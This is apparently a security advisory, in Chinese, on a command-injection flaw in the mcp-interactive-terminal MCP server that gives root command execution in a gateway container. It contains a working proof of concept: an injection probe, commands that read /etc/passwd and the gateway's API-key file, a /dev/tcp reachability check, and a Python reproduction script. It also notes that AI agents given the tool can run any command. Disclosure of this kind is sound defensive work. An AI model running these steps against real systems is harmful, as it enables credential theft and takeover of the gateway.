---
id: MCPVULN-001
mcp_service: mcp-interactive-terminal
mcp_version: 1.0.7
mcp_package: "mcp-interactive-terminal@1.0.7"
source: npm
tool: send_command
param: input
vuln_type: command_injection
cwe: CWE-78
severity: critical
status: confirmed
confirmed_exploitable: true
detection_channel: inband
detected_by: mcpfuzz v2
discovered: 2026-11-01
target_env: "mcphub gateway /mcp/interactive-terminal（stdio 跑在网关容器内）"
---

# 漏洞说明：mcp-interactive-terminal 任意命令执行（容器内 RCE），危害整个 MCP 网关

| 项 | 内容 |
|---|---|
| 组件 | `mcp-interactive-terminal@1.0.7`（经 mcphub 网关以 stdio 接入） |
| 端点 | `http://<gateway>:3000/mcp/interactive-terminal`（实测 MCP 端点未开鉴权） |
| 工具/参数 | `send_command.input`（注入点，检测器自动定位） |
| 类型 | 命令注入 / 任意命令执行（CWE-78） |
| 严重程度 | **严重（Critical）** —— 以 root 在网关容器内任意执行、可窃取网关密钥、影响同容器所有 MCP |
| 发现方式 | mcpfuzz 黑盒检测，inband 求值回显通道确认 |

## 1. 威胁模型（为什么容器内 RCE 就是真危害）

网关 mcphub 部署在 **Docker 容器**里，各 MCP 服务由网关以 **stdio 子进程跑在同一容器内**。因此**对一个 MCP 服务而言，它的"宿主机"就是这个容器**。只要能通过 MCP 危害到该容器（root 执行、读网关凭据、影响同容器的网关与其它 MCP、容器内横向/篡改），即构成真实、可利用的危害——**不需要逃逸到物理宿主机**。本例容器非特权、未挂 docker.sock（见 §5），故无现成宿主逃逸路径，但**危害已覆盖整个 MCP 基础设施**（网关本体 + 其管理的全部后端 + 其配置密钥）。

## 2. 漏洞描述与根因

`interactive-terminal` 对外暴露 `send_command(session_id, input)`，将 `input` 原样送入一个 **root 身份的 bash 会话**执行。任何能访问该 MCP 端点的一方（或被赋予此 MCP 的 AI 智能体）即可执行任意命令。

该 MCP **自带 `confirm_dangerous_command` 工具**，表明厂商本意是"危险命令需二次确认"。但实测 `send_command` **直接执行危险命令、不触发任何确认**（§4 证据3）——**既有的安全控制形同虚设**。因此本问题不止"终端本职功能"，更是**一个失效的安全边界**。

## 3. 检测器如何发现（求值回显，区分"真执行"与"输入回显"）

检测器对 `send_command.input` 发命令注入探针，确认载荷：
```
$(echo mcpf5f076baad0$((41*41)))
```
目标响应：
```
bash: mcpf5f076baad01681: command not found
root@a58f93a76768:/#
```
判定要点：`$((41*41))` 被 **bash 求值成 1681**（响应里是 `mcpf5f076baad01681`，而非载荷里的 `...$((41*41))`）。这证明**载荷被 shell 真实执行**，而不是输入被原样回显——因此判"确认"，且不会误报。命中标记 `...1681` 不在载荷内，通过反射感知校验。

## 4. PoC —— 触发步骤与可利用性证据（均已实测，密钥值脱敏）

攻击路径：MCP 端点 → `create_session`（建 root bash 会话）→ `send_command`（执行任意命令）。

**步骤 0 建会话**
```
tools/call interactive-terminal-create_session {"command":"bash","name":"poc"}
→ {"session_id":"cf13a020","name":"poc","pid":4579}
```
**步骤 N `send_command {"session_id":"<sid>","input":"<命令>"}`**，证据如下：

**证据1 · 以 root 执行、容器身份**
```
$ id
uid=0(root) gid=0(root) groups=0(root)
$ hostname ; cat /etc/os-release | head -1
a58f93a76768
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
```

**证据2 · "危险命令确认"防护被绕过**（直接执行敏感读取，无任何确认）
```
$ cat /etc/passwd | head -1
root:x:0:0:root:/root:/bin/bash
```

**证据3 · 窃取网关密钥**（同容器可读网关配置 `/app/data/mcp_settings.json`，含 15 行敏感项）
实际读到并可外带以下密钥字段（值脱敏，均非空）：
```
systemConfig.routing.bearerAuthKey          = ***      ← 网关 MCP 端点 Bearer 鉴权密钥
systemConfig.smartRouting.llmProviderApiKey = ***      ← LLM 提供方 API Key
systemConfig.smartRouting.azureOpenaiApiKey = ***      ← Azure OpenAI API Key
systemConfig.mcpRouter.apiKey               = ***      ← mcpRouter API Key
```
→ 可直接盗用 LLM API Key（计费滥用），并拿到网关 Bearer 鉴权密钥（即便端点开了鉴权也能伪造访问）。`/app/data/` 下另有 `mcp_settings.json.credentials.json` 凭据文件，同样可读。

**证据4 · 影响同容器的网关本体与其它 MCP**（共享 PID 命名空间）
```
$ ps -eo pid,comm | grep -iE 'node|git'
   1 node          ← mcphub 网关本体（PID 1）
 395 git  403 git  587 git  593 git  608 git   ← 同容器的 git-mcp 后端进程
```
→ root 可向这些进程发信号（kill PID 1 = 网关 DoS），或 ptrace 读其内存窃取运行时密钥。

**证据5 · 网络横向/外带**
```
$ bash -c 'echo > /dev/tcp/127.0.0.1/3000 && echo REACHABLE'
REACHABLE                      ← 从容器内可达网关管理口（配合窃取的密钥可接管网关 API）
（出网可用，可外带窃取数据）
```

## 5. 隔离现状（危害天花板）

```
CapEff: 00000000a80425fb               ← docker 默认能力集，非特权
ls /var/run/docker.sock → No such file ← 未挂 docker.sock
```
→ **无现成的物理宿主逃逸路径**。但依威胁模型（§1），危害已达容器级满额：**整个网关 + 其管理的全部 MCP + 全部配置密钥沦陷**。

## 6. 影响（Impact）

任何能访问 `/mcp/interactive-terminal` 端点者，或被赋予该 MCP 的 AI 智能体，可：
1. 以 root 在网关容器内**任意命令执行**；
2. **窃取网关密钥**（Bearer 鉴权密钥、多个 LLM/云 API Key）→ 接管网关、盗刷 API；
3. **攻陷同容器的所有其它 MCP 后端**（如 git-mcp）及网关本体（可 DoS / 窃取其运行时密钥）；
4. 以此为**跳板横向/外带**。
整个 MCP 网关及其后端生态在此容器内完全沦陷。

## 7. 复现（最小命令）

```bash
# 经网关单后端口（端点鉴权已关）
python - <<'PY'
from mcpfuzz.driver import call_tool_sync
U="http://127.0.0.1:3000/mcp/interactive-terminal"
r=call_tool_sync(U,"interactive-terminal-create_session",{"command":"bash","name":"poc"})
import re,json; sid=re.search(r'"session_id":\s*"([0-9a-f]+)"',r["text"]).group(1)
def run(c): 
    x=call_tool_sync(U,"interactive-terminal-send_command",{"session_id":sid,"input":c})
    print(json.loads(x["text"])["output"])
run("id")                                   # → uid=0(root)
run("cat /app/data/mcp_settings.json")      # → 网关全部配置+密钥
call_tool_sync(U,"interactive-terminal-close_session",{"session_id":sid,"signal":"SIGKILL"})
PY
```

## 8. 修复建议

- **不应**把一个以 root、无隔离、与网关/其它 MCP 同容器、可读网关密钥的"任意命令执行"工具对外暴露；若必须提供终端能力：
  - 置于**独立的、非 root、强隔离（seccomp/最小 capability/只读根文件系统/独立网络命名空间）的一次性容器**，与网关及其它后端**物理隔离**；
  - 网关密钥/凭据**不与任何后端同容器**、不以明文置于后端可读路径；
  - 真正落实 `confirm_dangerous_command`：`send_command` 对危险模式**默认拒绝**、必须显式确认；
  - MCP 端点**开启鉴权**，最小权限暴露。
